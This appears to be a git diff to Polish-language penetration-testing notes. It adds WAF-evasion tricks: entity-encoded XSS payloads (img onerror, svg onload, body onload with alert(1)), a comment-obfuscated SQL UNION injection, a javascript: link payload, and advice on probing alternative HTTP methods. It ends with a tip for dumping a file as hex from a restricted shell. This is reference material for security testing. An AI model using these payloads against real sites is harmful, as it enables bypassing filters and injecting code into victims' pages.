@@ -681,13 +681,26 @@ Rubeus.exe asreproast
 ```
 ## Notatki
 ### Encoding
-URL-encoding: / => %2f
-Hex-encoding: _ => \x5f, 0x5f
-Unicode-encoding: % => \u0025
-Case Sensitivity (using mixed-cases to avoid detection)
-Obfuscation using White Space and Delimiters
-'/**/UNION/**/SELECT/**/1,2
-<a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>
+URL-encoding: / => %2f  
+Hex-encoding: _ => \x5f, 0x5f  
+Unicode-encoding: % => \u0025  
+Case Sensitivity (using mixed-cases to avoid detection)  
+Obfuscation using White Space and Delimiters  
+<img src=x onerror=&#97;lert(1)>(decimal encoding for 'a')  
+<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>(hex encoding for 'alert')  
+<body onload=&#97;&#108;&#101;&#114;&#116;(1)>(full decimal encoding)  
+'/**/UNION/**/SELECT/**/1,2  
+<a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>  
+### Testing Alternative HTTP Methods
+Beyond GET and POST, HTTP supports several other methods. While not all applications process these methods, testing them can reveal unexpected behaviour or bypass opportunities. WAFs may not apply the same security rules to all methods.
+
+Common Alternative Methods
+HEAD: Returns only headers (like GET but without body)
+OPTIONS: Returns allowed methods and CORS configuration
+PUT: Often used by REST APIs to update resources
+PATCH: Similar to PUT, for partial updates
+DELETE: Used to delete resources
+TRACE: Echoes back the request (often disabled)
 ### Jeśli masz ograniczony shell i nie możesz przesłać pliku, możesz go "wypluć" jako tekst i skopiować:
 ```
 xxd -p tajny_plik.zip > data.hex
